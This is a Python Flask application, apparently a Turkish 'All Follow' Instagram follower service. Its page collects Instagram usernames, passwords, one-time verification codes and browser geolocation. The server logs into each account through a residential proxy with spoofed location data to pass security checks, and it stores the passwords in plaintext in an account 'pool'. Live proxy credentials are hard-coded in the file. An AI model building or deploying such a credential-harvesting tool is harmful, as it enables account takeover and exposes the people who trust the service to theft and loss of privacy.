import os
from flask import Flask, request, jsonify, render_template_string
from flask_sqlalchemy import SQLAlchemy
from instagrapi import Client

app = Flask(__name__)
app.config['SQLALCHEMY_DATABASE_URI'] = "sqlite:///allfollow_chameleon.db"
app.config['SQLALCHEMY_TRACK_MODIFICATIONS'] = False
db = SQLAlchemy(app)

PROXY_URL = "http://pcUjiruWbB-res-tr:PC_4gAMh8pCXyTQAxKW1@proxy-eu.proxy-cheap.com:5959"

class PoolUser(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    username = db.Column(db.String(100), unique=True, nullable=False)
    password = db.Column(db.String(100), nullable=False)
    status = db.Column(db.String(255), default="Beklemede")

temp_clients = {}

@app.route('/')
def home():
    return render_template_string("""
    <!DOCTYPE html>
    <html lang="tr">
    <head>
        <meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>All Follow | Chameleon v4.5</title>
        <script src="https://cdn.tailwindcss.com"></script>
    </head>
    <body class="bg-[#0a0f1e] flex items-center justify-center min-h-screen text-slate-200">
        <div class="bg-[#161b2c] p-8 rounded-[2.5rem] w-full max-w-[380px] border border-slate-800 shadow-2xl">
            <h1 class="text-3xl font-black text-center text-blue-500 italic mb-1">ALL FOLLOW</h1>
            <p id="loc-status" class="text-[9px] text-center text-emerald-500 tracking-widest mb-8 uppercase font-bold">📍 Konum Senkronizasyonu Aktif</p>
            
            <div id="login-box" class="space-y-4">
                <input id="u" placeholder="Instagram Kullanıcı Adı" class="w-full bg-[#0a0f1e] border border-slate-800 p-4 rounded-xl outline-none focus:border-blue-600">
                <input id="p" type="password" placeholder="Şifre" class="w-full bg-[#0a0f1e] border border-slate-800 p-4 rounded-xl outline-none focus:border-blue-600">
                <button onclick="getLocationAndLogin()" id="btn" class="w-full bg-blue-600 py-4 rounded-xl font-bold hover:bg-blue-500 shadow-lg transition-all">SİSTEME GİRİŞ YAP</button>
            </div>

            <div id="otp-box" class="hidden space-y-4 mt-4">
                <input id="otp" placeholder="6 Haneli Kod" class="w-full bg-[#0a0f1e] border border-yellow-800 p-4 rounded-xl outline-none text-center tracking-widest text-xl">
                <button onclick="verifyOtp()" class="w-full bg-yellow-600 py-4 rounded-xl font-bold">KODU DOĞRULA</button>
            </div>
            
            <p id="msg" class="text-[11px] mt-6 text-center font-semibold text-slate-500 uppercase leading-relaxed"></p>
        </div>

        <script>
            let user = "";
            let userCoords = { lat: 41.0082, lng: 28.9784 }; // Default İstanbul

            // Tarayıcıdan konumu al
            navigator.geolocation.getCurrentPosition((pos) => {
                userCoords.lat = pos.coords.latitude;
                userCoords.lng = pos.coords.longitude;
                document.getElementById('loc-status').innerText = "📍 KONUM EŞLENDİ: OK";
            }, (err) => {
                document.getElementById('loc-status').innerText = "⚠️ VARSAYILAN KONUM KULLANILIYOR";
                document.getElementById('loc-status').className = "text-[9px] text-center text-yellow-500 tracking-widest mb-8 uppercase font-bold";
            });

            async function getLocationAndLogin() {
                const u=document.getElementById('u').value.trim().toLowerCase(), p=document.getElementById('p').value;
                user = u;
                const btn=document.getElementById('btn'), msg=document.getElementById('msg');
                btn.disabled = true; msg.innerText = "Konum tüneli üzerinden bağlanılıyor...";
                
                const r = await fetch('/api/login', {
                    method:'POST',
                    headers:{'Content-Type':'application/json'},
                    body:JSON.stringify({u, p, lat: userCoords.lat, lng: userCoords.lng})
                });
                const d = await r.json();
                
                if(d.status === "challenge") {
                    document.getElementById('login-box').classList.add('hidden');
                    document.getElementById('otp-box').classList.remove('hidden');
                    msg.innerText = "Kod e-postanıza gönderildi.";
                } else {
                    msg.innerText = d.msg; btn.disabled = false;
                }
            }

            async function verifyOtp() {
                const code = document.getElementById('otp').value;
                const r = await fetch('/api/verify', {method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({u:user, code:code})});
                const d = await r.json();
                document.getElementById('msg').innerText = d.msg;
                if(d.status === "success") setTimeout(() => location.reload(), 2000);
            }
        </script>
    </body>
    </html>
    """)

@app.route('/api/login', methods=['POST'])
def login():
    data = request.json
    u, p = data.get('u'), data.get('p')
    lat, lng = data.get('lat'), data.get('lng')
    
    cl = Client()
    cl.set_proxy(PROXY_URL)
    cl.set_locale("tr_TR")
    cl.set_country("TR")

    try:
        # Gelen konumu botun cihazına enjekte et
        cl.set_location(lat, lng)
        cl.login(u, p)
        
        user_record = PoolUser.query.filter_by(username=u).first()
        if not user_record: user_record = PoolUser(username=u, password=p); db.session.add(user_record)
        user_record.status = "AKTİF ✅"
        db.session.commit()
        return jsonify(status="success", msg="Konum senkronize edildi, giriş başarılı!")

    except Exception as e:
        err = str(e).lower()
        if "challenge" in err or "checkpoint" in err:
            temp_clients[u] = {"client": cl, "password": p, "lat": lat, "lng": lng}
            return jsonify(status="challenge", msg="Kod gerekli")
        return jsonify(status="error", msg="Hatalı bilgi veya IP engeli.")

@app.route('/api/verify', methods=['POST'])
def verify():
    data = request.json
    u, code = data.get('u'), data.get('code')
    stored = temp_clients.get(u)
    if not stored: return jsonify(status="error", msg="Zaman aşımı.")

    try:
        stored["client"].login(u, stored["password"], verification_code=code)
        # Onaydan sonra da konumu mühürle
        stored["client"].set_location(stored["lat"], stored["lng"])
        
        user_record = PoolUser.query.filter_by(username=u).first()
        if not user_record: user_record = PoolUser(username=u, password=stored["password"]); db.session.add(user_record)
        user_record.status = "AKTİF ✅"
        db.session.commit()
        return jsonify(status="success", msg="Konum doğrulandı!")
    except:
        return jsonify(status="error", msg="Kod yanlış.")

if __name__ == "__main__":
    with app.app_context(): db.create_all()
    app.run(host="0.0.0.0", port=int(os.getenv("PORT", 10000)))
